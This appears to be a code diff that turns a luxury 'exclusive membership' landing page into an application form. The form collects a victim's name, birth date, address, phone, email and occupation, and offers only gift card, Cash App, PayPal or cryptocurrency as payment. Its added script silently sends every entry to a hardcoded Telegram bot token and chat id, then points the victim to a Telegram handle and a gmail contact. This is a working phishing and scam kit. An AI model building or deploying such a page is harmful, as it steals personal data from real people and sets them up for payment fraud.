@@ -3,101 +3,438 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Exclusive Membership | Elite Access</title>
+  <title>Application | Elite Access</title>
   
-  <!-- Google Fonts for Luxury Typography -->
+  <!-- Premium Typography -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
   
-  <!-- Tailwind CSS via CDN -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  
-  <!-- Tailwind Custom Configuration -->
-  <script>
-    tailwind.config = {
-      theme: {
-        extend: {
-          fontFamily: {
-            cinzel: ['Cinzel', 'serif'],
-            sans: ['Inter', 'sans-serif'],
-          },
-          animation: {
-            'gradient-x': 'gradient-x 15s ease infinite',
-            'fade-in-up': 'fadeInUp 1.2s cubic-bezier(0.16, 1, 0.3, 1) forwards',
-            'pulse-slow': 'pulse 4s cubic-bezier(0.4, 0, 0.6, 1) infinite',
-          },
-          keyframes: {
-            'gradient-x': {
-              '0%, 100%': {
-                'background-size': '200% 200%',
-                'background-position': 'left center'
-              },
-              '50%': {
-                'background-size': '200% 200%',
-                'background-position': 'right center'
-              }
-            },
-            'fadeInUp': {
-              '0%': { opacity: '0', transform: 'translateY(40px)' },
-              '100%': { opacity: '1', transform: 'translateY(0)' },
-            }
-          }
-        }
+  <style>
+    /* Reset & Base Layout */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      background-color: #0a0a0a;
+      color: #f4f4f5;
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* Ambient Lighting Background Effects */
+    body::before, body::after {
+      content: "";
+      position: absolute;
+      width: 500px;
+      height: 500px;
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 0;
+      filter: blur(120px);
+      opacity: 0.04;
+    }
+    body::before {
+      top: -10%;
+      left: -10%;
+      background: #f59e0b;
+    }
+    body::after {
+      bottom: -10%;
+      right: -10%;
+      background: #d97706;
+    }
+
+    /* Form Card Container */
+    .form-container {
+      position: relative;
+      width: 100%;
+      max-width: 680px;
+      background: rgba(255, 255, 255, 0.02);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 24px;
+      padding: 50px 40px;
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.7);
+      z-index: 10;
+    }
+
+    /* Top Decorative Accent Line */
+    .form-container::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 25%;
+      width: 50%;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(245, 158, 11, 0.4), transparent);
+    }
+
+    /* Header Styling */
+    .form-header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    .form-header h2 {
+      font-family: 'Cinzel', serif;
+      font-size: 2.2rem;
+      font-weight: 700;
+      letter-spacing: 1px;
+      background: linear-gradient(135deg, #fef3c7 0%, #f59e0b 50%, #b45309 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 10px;
+    }
+
+    .form-header p {
+      color: #71717a;
+      font-size: 0.95rem;
+      font-weight: 300;
+    }
+
+    /* Form Fields Grid Layout */
+    .form-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+    }
+
+    /* Make large fields span full width */
+    .full-width {
+      grid-column: span 2;
+    }
+
+    .field-group {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .field-group label {
+      font-size: 0.75rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      tracking: 0.05em;
+      color: rgba(245, 158, 11, 0.8);
+    }
+
+    /* Input and Select Element Formatting */
+    input, select {
+      width: 100%;
+      padding: 14px 16px;
+      background: rgba(24, 24, 27, 0.6);
+      border: 1px solid #27272a;
+      border-radius: 12px;
+      color: #ffffff;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.95rem;
+      transition: all 0.3s ease;
+      outline: none;
+    }
+
+    input:focus, select:focus {
+      border-color: #f59e0b;
+      box-shadow: 0 0 0 1px rgba(245, 158, 11, 0.5);
+      background: rgba(24, 24, 27, 0.9);
+    }
+
+    input::placeholder {
+      color: #52525b;
+    }
+
+    /* Dark theme fix for calendar pickers */
+    input[type="date"] {
+      color-scheme: dark;
+    }
+
+    /* Submit Button */
+    .submit-wrap {
+      margin-top: 30px;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(90deg, #fbbf24, #f59e0b, #d97706);
+      border: none;
+      border-radius: 12px;
+      color: #000000;
+      font-size: 0.95rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      box-shadow: 0 4px 20px rgba(245, 158, 11, 0.2);
+    }
+
+    .submit-btn:hover {
+      transform: scale(1.015);
+      box-shadow: 0 4px 30px rgba(245, 158, 11, 0.4);
+    }
+
+    /* Hidden Contact Section styling */
+    .contact-box {
+      display: none;
+      margin-top: 30px;
+      border: 1px solid rgba(245, 158, 11, 0.2);
+      background: rgba(245, 158, 11, 0.02);
+      padding: 24px;
+      border-radius: 16px;
+      text-align: center;
+      animation: fadeIn 0.5s ease forwards;
+    }
+
+    .contact-box p {
+      font-family: 'Cinzel', serif;
+      color: #fbbf24;
+      font-size: 0.9rem;
+      letter-spacing: 1px;
+      margin-bottom: 20px;
+    }
+
+    .contact-links {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 24px;
+    }
+
+    .contact-icon-btn {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 14px;
+      background: #18181b;
+      border: 1px solid #27272a;
+      border-radius: 12px;
+      transition: all 0.3s ease;
+    }
+
+    .contact-icon-btn:hover {
+      transform: scale(1.1);
+      border-color: rgba(245, 158, 11, 0.4);
+      background: #27272a;
+    }
+
+    .contact-icon-btn img {
+      width: 32px;
+      height: 32px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Responsive Adjustments */
+    @media (max-width: 600px) {
+      .form-grid {
+        grid-template-columns: 1fr;
+      }
+      .full-width {
+        grid-column: span 1;
+      }
+      .form-container {
+        padding: 35px 20px;
+      }
+      .form-header h2 {
+        font-size: 1.8rem;
       }
     }
-  </script>
+  </style>
 </head>
-<body class="bg-black text-white min-h-screen flex items-center justify-center relative overflow-hidden font-sans selection:bg-amber-500 selection:text-black">
+<body>
 
-  <!-- Dynamic Ambient Background -->
-  <div class="absolute inset-0 bg-gradient-to-br from-black via-zinc-950 to-amber-900/20 animate-gradient-x z-0"></div>
-
-  <!-- Subtle Background Glow Orbs for Depth -->
-  <div class="absolute top-0 left-1/4 w-96 h-96 bg-amber-600/10 rounded-full blur-[120px] animate-pulse-slow z-0 pointer-events-none"></div>
-  <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-yellow-500/10 rounded-full blur-[120px] animate-pulse-slow delay-1000 z-0 pointer-events-none"></div>
-
-  <!-- Main Card Container -->
-  <div class="relative z-10 w-full max-w-2xl px-6 animate-fade-in-up">
+  <div class="form-container">
     
-    <!-- Glassmorphism Effect -->
-    <div class="backdrop-blur-xl bg-white/[0.02] border border-white/[0.05] rounded-3xl p-10 md:p-16 text-center shadow-[0_8px_32px_0_rgba(0,0,0,0.6)] ring-1 ring-amber-500/20 relative overflow-hidden">
-      
-      <!-- Subtle top border highlight -->
-      <div class="absolute top-0 left-1/2 -translate-x-1/2 w-3/4 h-px bg-gradient-to-r from-transparent via-amber-500/50 to-transparent"></div>
+    <div class="form-header">
+      <h2>Membership Application</h2>
+      <p>Complete the dossier below to clear your verification process.</p>
+    </div>
 
-      <!-- Eyebrow Badge -->
-      <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-amber-500/10 border border-amber-500/20 mb-8 transition-colors hover:bg-amber-500/20 cursor-default">
-        <span class="w-2 h-2 rounded-full bg-amber-500 animate-pulse shadow-[0_0_10px_rgba(245,158,11,0.8)]"></span>
-        <span class="text-amber-500 text-xs font-semibold tracking-[0.2em] uppercase">By Invitation Only</span>
+    <form id="membershipForm">
+      <div class="form-grid">
+        
+        <!-- Full Name -->
+        <div class="field-group">
+          <label for="name">Full Name</label>
+          <input type="text" id="name" placeholder="John Doe" required>
+        </div>
+
+        <!-- Date of Birth -->
+        <div class="field-group">
+          <label for="dob">Date of Birth</label>
+          <input type="date" id="dob" required>
+        </div>
+
+        <!-- Gender -->
+        <div class="field-group">
+          <label for="gender">Gender</label>
+          <select id="gender" required>
+            <option value="">Select Gender</option>
+            <option>Male</option>
+            <option>Female</option>
+          </select>
+        </div>
+
+        <!-- Phone Number -->
+        <div class="field-group">
+          <label for="phone">Phone Number</label>
+          <input type="tel" id="phone" placeholder="+1 (555) 000-0000" required>
+        </div>
+
+        <!-- Email Address -->
+        <div class="field-group full-width">
+          <label for="email">Email Address</label>
+          <input type="email" id="email" placeholder="johndoe@luxury.com" required>
+        </div>
+
+        <!-- Home Address -->
+        <div class="field-group full-width">
+          <label for="address">Home Address</label>
+          <input type="text" id="address" placeholder="123 Luxury Way, Beverly Hills" required>
+        </div>
+
+        <!-- Occupation -->
+        <div class="field-group">
+          <label for="occupation">Occupation</label>
+          <input type="text" id="occupation" placeholder="Executive / Founder" required>
+        </div>
+
+        <!-- Country -->
+        <div class="field-group">
+          <label for="country">Country</label>
+          <input type="text" id="country" placeholder="United States" required>
+        </div>
+
+        <!-- Membership Tier -->
+        <div class="field-group">
+          <label for="card">Membership Tier</label>
+          <select id="card" required>
+            <option value="">Select Card Tier</option>
+            <option>Gold</option>
+            <option>Silver</option>
+            <option>Platinum</option>
+            <option>Diamond</option>
+          </select>
+        </div>
+
+        <!-- Payment Method -->
+        <div class="field-group">
+          <label for="payment">Payment Method</label>
+          <select id="payment" required>
+            <option value="">Select Payment</option>
+            <option>PayPal</option>
+            <option>Cash App</option>
+            <option>Gift Card</option>
+            <option>Cryptocurrency</option>
+          </select>
+        </div>
+
+        <!-- Date of Application -->
+        <div class="field-group full-width">
+          <label for="applicationDate">Application Date</label>
+          <input type="date" id="applicationDate" required>
+        </div>
+
       </div>
 
-      <!-- Heading -->
-      <h1 class="font-cinzel text-5xl md:text-6xl font-bold mb-6 text-transparent bg-clip-text bg-gradient-to-r from-amber-200 via-yellow-400 to-amber-700 drop-shadow-sm tracking-wide leading-tight">
-        Excellence <br /> Refined
-      </h1>
+      <div class="submit-wrap">
+        <button type="button" class="submit-btn" onclick="submitForm()">Submit Dossier</button>
+      </div>
 
-      <!-- Body Copy -->
-      <p class="text-zinc-400 text-lg md:text-xl leading-relaxed mb-12 font-light max-w-lg mx-auto">
-        Step into a world of unparalleled prestige. Secure your Gold, Platinum, or Diamond tier and unlock experiences crafted strictly for the elite.
-      </p>
+      <!-- Action Box dynamically opened on response success -->
+      <div id="contactOptions" class="contact-box">
+        <p>Elevate Inquiry to Executive Management:</p>
+        <div class="contact-links">
+          <a href="https://t.me/Privatechat_4296" target="_blank" class="contact-icon-btn">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+          </a>
+          <a href="mailto:officialfanbase35@gmail.com?subject=Membership%20Application" target="_blank" class="contact-icon-btn">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Mail_%28iOS%29.svg" alt="Email">
+          </a>
+        </div>
+      </div>
 
-      <!-- Premium Call to Action Button -->
-      <a href="form.html" class="group relative inline-flex items-center justify-center px-8 py-4 font-semibold text-black transition-all duration-500 bg-gradient-to-r from-amber-400 via-yellow-500 to-amber-600 rounded-full hover:scale-105 hover:shadow-[0_0_40px_rgba(245,158,11,0.4)] overflow-hidden">
-        
-        <!-- Button Shimmer Effect -->
-        <span class="absolute inset-0 w-full h-full -mt-1 rounded-lg opacity-30 bg-gradient-to-b from-transparent via-transparent to-black"></span>
-        
-        <span class="relative flex items-center gap-3 text-lg tracking-wide">
-          Acquire Membership
-          <!-- Animated SVG Arrow -->
-          <svg class="w-5 h-5 transition-transform duration-300 group-hover:translate-x-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
-          </svg>
-        </span>
-      </a>
-
-    </div>
+    </form>
   </div>
+
+  <script>
+    function submitForm() {
+      // Clean target variables updated from your parameters
+      const botToken = "8832753288:AAGI4QdKm9gx2hy-dJcomSOHmRrWQ_y32bc";
+      const chatId = "5230437038";
+
+      const name = document.getElementById('name').value;
+      const dob = document.getElementById('dob').value;
+      const gender = document.getElementById('gender').value;
+      const phone = document.getElementById('phone').value;
+      const email = document.getElementById('email').value;
+      const address = document.getElementById('address').value;
+      const occupation = document.getElementById('occupation').value;
+      const country = document.getElementById('country').value;
+      const card = document.getElementById('card').value;
+      const payment = document.getElementById('payment').value;
+      const applicationDate = document.getElementById('applicationDate').value;
+
+      // Ensure mandatory text data exists
+      if(!name || !email || !phone || !card) {
+        alert("Please complete the required application fields.");
+        return;
+      }
+
+      // Constructed string using basic hyphens to prevent formatting parser exceptions inside Telegram
+      const message = 
+        "🌟 New Membership Application:\n" +
+        "- Full Name: " + name + "\n" +
+        "- Date of Birth: " + dob + "\n" +
+        "- Gender: " + gender + "\n" +
+        "- Phone Number: " + phone + "\n" +
+        "- Email: " + email + "\n" +
+        "- Home Address: " + address + "\n" +
+        "- Occupation: " + occupation + "\n" +
+        "- Country: " + country + "\n" +
+        "- Membership Card: " + card + "\n" +
+        "- Payment Method: " + payment + "\n" +
+        "- Date of Application: " + applicationDate;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          document.getElementById('contactOptions').style.display = 'block';
+          alert("Application submitted successfully!");
+        } else {
+          console.error("Telegram API Error:", data);
+          alert("Submission failed: " + data.description);
+        }
+      })
+      .catch(error => {
+        alert("Network communication error: " + error);
+      });
+    }
+  </script>
+
 </body>
 </html>
